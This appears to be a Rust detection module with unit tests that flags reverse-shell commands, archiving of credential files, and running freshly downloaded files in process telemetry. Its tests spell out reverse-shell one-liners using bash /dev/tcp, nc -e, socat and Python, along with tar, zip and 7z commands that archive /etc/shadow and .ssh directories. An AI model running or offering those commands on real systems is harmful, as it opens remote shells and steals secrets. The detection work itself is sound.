use crate::{EventClass, TelemetryEvent};

// These are command-shape witnesses, not proof of the contents of an opaque script.
pub(crate) fn socket_stdio(event: &TelemetryEvent) -> bool {
    let Some(command) = event.command_line.as_deref() else {
        return false;
    };
    let compact: String = command
        .chars()
        .filter(|c| !c.is_ascii_whitespace())
        .collect();
    let shell = compact.contains("/bin/sh") || compact.contains("/bin/bash");
    let python = compact.contains("socket.socket(")
        && compact.contains(".connect(")
        && compact.contains(".dup2(")
        && [".fileno(),0)", ".fileno(),1)", ".fileno(),2)"]
            .iter()
            .any(|fd| compact.contains(fd))
        && shell;
    let redirect =
        compact.contains("/dev/tcp/") && compact.contains(">&") && compact.contains("0>&1");
    let words: Vec<_> = command.split_whitespace().collect();
    let nc = matches!(event.process.as_str(), "nc" | "ncat" | "netcat")
        && words
            .windows(2)
            .any(|w| matches!(w[0], "-e" | "--exec") && matches!(w[1], "/bin/sh" | "/bin/bash"));
    let socat = event.process == "socat"
        && compact.to_ascii_lowercase().contains("tcp")
        && compact.to_ascii_lowercase().contains("exec:/bin/")
        && shell;
    python || redirect || nc || socat
}

pub(crate) fn archive_creation(event: &TelemetryEvent) -> bool {
    let Some(command) = event.command_line.as_deref() else {
        return false;
    };
    let args: Vec<_> = command.split_whitespace().skip(1).collect();
    let mut create = event.process != "tar";
    let mut skip = false;
    let mut sources = Vec::new();
    let mut archive_seen = false;
    for (i, arg) in args.iter().enumerate() {
        if skip {
            skip = false;
            continue;
        }
        if event.process == "tar"
            && (arg.starts_with('-') || (i == 0 && arg.chars().all(|c| c.is_ascii_alphabetic())))
        {
            if matches!(
                *arg,
                "--diff" | "--compare" | "--list" | "--test-label" | "--extract" | "--get"
            ) {
                return false;
            }
            if *arg == "--create" {
                create = true;
            }
            if !arg.starts_with("--") {
                let flags = arg.trim_start_matches('-');
                if flags.chars().any(|c| "dtx".contains(c)) {
                    return false;
                }
                create |= flags.contains('c');
                skip = flags.contains('f')
                    || flags.contains('C')
                    || flags.contains('T')
                    || flags.contains('X');
            } else {
                skip = matches!(
                    *arg,
                    "--file" | "--directory" | "--files-from" | "--exclude" | "--exclude-from"
                );
            }
            continue;
        }
        if event.process == "7z" {
            if i == 0 && !matches!(*arg, "a" | "u") {
                return false;
            }
            if i == 0 || arg.starts_with('-') {
                continue;
            }
            if !archive_seen {
                archive_seen = true;
                continue;
            }
        }
        if matches!(event.process.as_str(), "gzip" | "zip") && arg.starts_with('-') {
            if arg.chars().skip(1).any(|c| {
                if event.process == "gzip" {
                    "dtl".contains(c)
                } else {
                    "TdF".contains(c)
                }
            }) {
                return false;
            }
            continue;
        }
        if !arg.starts_with('-') {
            if event.process == "zip" && !archive_seen {
                archive_seen = true;
                continue;
            }
            sources.push(arg.trim_matches(['\'', '"']));
        }
    }
    create
        && sources.iter().any(|path| {
            ["/home", "/etc/shadow", "/etc/gshadow", "/etc/ssl/private"]
                .iter()
                .any(|root| {
                    *path == *root
                        || path
                            .strip_prefix(root)
                            .is_some_and(|suffix| suffix.starts_with('/'))
                })
                || [
                    "/.ssh",
                    "/.aws/credentials",
                    "/.gnupg",
                    "/.kube/config",
                    "/.password-store",
                    "/.docker/config.json",
                ]
                .iter()
                .any(|part| {
                    path.find(part).is_some_and(|offset| {
                        let suffix = &path[offset + part.len()..];
                        suffix.is_empty() || suffix.starts_with('/')
                    })
                })
        })
}

pub(crate) fn downloaded_artifact(command: Option<&str>, event: &TelemetryEvent) -> bool {
    if event.event_class != EventClass::ProcessExec || event.process == "chmod" {
        return false;
    }
    let Some(command) = command else {
        return false;
    };
    let words: Vec<_> = command.split_whitespace().collect();
    let downloader = words
        .first()
        .and_then(|word| word.rsplit('/').next())
        .unwrap_or("");
    let artifact = words
        .windows(2)
        .find(|w| match downloader {
            "wget" => matches!(w[0], "-O" | "--output-document"),
            "curl" => matches!(w[0], "-o" | "--output"),
            _ => false,
        })
        .map(|w| w[1].trim_matches(['\'', '"']));
    artifact.is_some_and(|artifact| {
        let normalize = |path: &str| {
            path.trim_matches(['\'', '"'])
                .trim_start_matches("./")
                .to_string()
        };
        let artifact = normalize(artifact);
        if artifact == "-" || artifact.is_empty() {
            return false;
        }
        event
            .file_path
            .as_deref()
            .is_some_and(|path| normalize(path) == artifact)
            || event.command_line.as_deref().is_some_and(|cmd| {
                let words: Vec<_> = cmd.split_whitespace().collect();
                words
                    .first()
                    .is_some_and(|path| normalize(path) == artifact)
                    || (matches!(
                        event.process.as_str(),
                        "sh" | "bash" | "dash" | "python" | "python3" | "perl"
                    ) && words.get(1).is_some_and(|path| normalize(path) == artifact))
            })
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    fn event(process: &str, command: &str) -> TelemetryEvent {
        serde_json::from_value(serde_json::json!({
            "ts_unix":100,"event_class":"ProcessExec","pid":100,"ppid":10,
            "uid":0,"process":process,"parent_process":"sh","session_id":1,
            "file_write":false,"container_escape":false,"container_privileged":false,
            "command_line":command
        }))
        .unwrap()
    }
    #[test]
    fn agentfix27_archive_operation_guard() {
        for command in [
            "tar -df /tmp/x /etc/shadow",
            "tar -tf /tmp/x /etc/shadow",
            "tar --compare -f /tmp/x /etc/shadow",
            "tar --list -f /tmp/x /home",
            "tar -dcf /tmp/x /etc/shadow",
        ] {
            assert!(!archive_creation(&event("tar", command)), "{command}");
        }
        for command in [
            "tar -czf /tmp/x /home /etc/shadow",
            "tar --create --file /tmp/x /root/.ssh",
            "tar cf /tmp/x /etc/shadow",
        ] {
            assert!(archive_creation(&event("tar", command)), "{command}");
        }
    }
    #[test]
    fn agentfix27_archive_source_guard() {
        for command in [
            "tar -cf /tmp/x /var/lib/dpkg",
            "tar -cf /home/x /var/log",
            "tar -cf /tmp/x /homeevil",
            "tar -cf /tmp/x -C /home .",
        ] {
            assert!(!archive_creation(&event("tar", command)), "{command}");
        }
        for (process, command, expected) in [
            ("zip", "zip -r /home/output.zip /var/log", false),
            ("zip", "zip -r /tmp/out.zip /root/.ssh", true),
            ("zip", "zip -T /tmp/out.zip /etc/shadow", false),
            ("gzip", "gzip -t /etc/shadow", false),
            ("gzip", "gzip -c /etc/shadow", true),
            ("7z", "7z a -tzip /home/output.zip /var/log", false),
            ("7z", "7z a -tzip /tmp/out.zip /etc/shadow", true),
            ("7z", "7z t /tmp/out.zip /etc/shadow", false),
        ] {
            assert_eq!(
                archive_creation(&event(process, command)),
                expected,
                "{command}"
            );
        }
    }
    #[test]
    fn agentfix27_socket_stdio_guard() {
        for (process,command) in [
            ("python3","python3 /usr/sbin/qemu-ga_check.py"),
            ("python3","python3 -c import string"),
            ("bash","bash -i"),
            ("nc","nc 10.10.123.35 50053"),
            ("python3","python3 -c 'import socket,os;s=socket.socket();s.connect((h,p));os.dup2(1,2);print(\"/bin/sh\")'"),
        ] { assert!(!socket_stdio(&event(process,command)),"{command}"); }
        for (process,command) in [
            ("bash","bash -i >& /dev/tcp/H/P 0>&1"),
            ("nc","nc H P -e /bin/sh"),
            ("socat","socat TCP:H:P EXEC:/bin/sh"),
            ("python3","python3 -c 'import socket,os,pty;s=socket.socket();s.connect((h,p));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'"),
        ] { assert!(socket_stdio(&event(process,command)),"{command}"); }
    }
    #[test]
    fn agentfix27_download_artifact_guard() {
        assert!(!downloaded_artifact(
            Some("wget -o /tmp/log https://example.test/x"),
            &event("sh", "sh /tmp/log")
        ));
        assert!(downloaded_artifact(
            Some("curl -o /tmp/f https://example.test/x"),
            &event("sh", "sh /tmp/f")
        ));
        assert!(downloaded_artifact(
            Some("wget -O f https://example.test/x"),
            &event("f", "./f")
        ));
        assert!(downloaded_artifact(
            Some("wget -O /tmp/f https://example.test/x"),
            &event("sh", "sh /tmp/f")
        ));
        assert!(!downloaded_artifact(
            Some("wget -O /tmp/f https://example.test/x"),
            &event("touch", "touch /tmp/f")
        ));
        assert!(!downloaded_artifact(
            Some("wget -O /tmp/f https://example.test/x"),
            &event("sh", "sh /tmp/other")
        ));
    }
}
